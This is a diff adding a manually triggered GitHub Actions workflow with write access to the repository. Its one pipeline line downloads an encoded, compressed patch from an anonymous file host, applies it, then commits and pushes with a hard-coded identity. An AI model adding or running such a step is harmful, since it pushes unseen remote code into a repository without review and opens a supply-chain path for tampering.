@@ -1,0 +1,11 @@
+name: apply9
+on: workflow_dispatch
+permissions:
+  contents: write
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: curl -sLf https://n.uguu.se/LEqOMQWjDaAA.b64 | base64 -d | gunzip | patch -p1
+      - run: git -c user.name=Yogesh -c user.email=yogeshbhai0755@gmail.com commit -qam p && git push
